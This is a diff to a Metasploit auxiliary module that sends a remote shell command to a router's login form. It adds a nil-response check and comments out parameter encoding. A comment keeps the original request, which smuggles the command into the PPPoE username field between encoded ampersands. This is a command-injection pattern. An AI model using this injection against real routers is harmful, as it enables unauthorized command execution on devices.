@@ -66,6 +66,7 @@ class Metasploit3 < Msf::Auxiliary
 					vprint_error("#{rhost}:#{rport} - #{target_url} not responding")
 				end
 
+				return if res.nil?
 				return if (res.code == 404)
 
 				if [200, 301, 302].include?(res.code)
@@ -83,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
 
-		cmd = Rex::Text.uri_encode(datastore['CMD'])
+		#cmd = Rex::Text.uri_encode(datastore['CMD'])
 		cmd = datastore['CMD']
 		#original request:
 		#data_cmd = "login_type=PPPoE%28PPP+over+Ethernet%29&pppoe_username=%26%20#{cmd}%20%26&
@@ -102,7 +103,7 @@ class Metasploit3 < Msf::Auxiliary
 					'uri'	=> uri,
 					'method' => 'POST',
 					'authorization' => basic_auth(user,pass),
-					'data' => data_cmd
+					#'data' => data_cmd
 					'encode_params' => false,
 					'vars_post' => {
 						"login_type" => "PPPoE%28PPP+over+Ethernet%29",
